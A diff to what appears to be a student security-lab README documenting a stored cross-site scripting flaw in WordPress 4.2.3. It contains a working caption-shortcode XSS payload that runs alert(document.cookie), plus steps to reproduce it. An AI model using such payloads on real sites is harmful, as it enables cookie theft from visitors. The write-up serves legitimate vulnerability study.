@@ -27,9 +27,9 @@ Time spent: **5** hours spent in total
   - [ ] GIF Walkthrough: ![](xss2.gif)
   - [ ] Steps to recreate: 
     - Create a new post with the following payload in the body
-    - ```xss2
-
-<a href="[caption code=">]</a><a title=" onmouseover=alert(document.cookie)  ">Click me</a>```
+    - ```xss2```
+    - ``` ```
+    - ```<a href="[caption code=">]</a><a title=" onmouseover=alert(document.cookie)  ">Click me</a>```
     - Go to the post and place the mouse cursor over the text "Click me"
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/4.2.3/src/wp-includes/class-wp-embed.php)
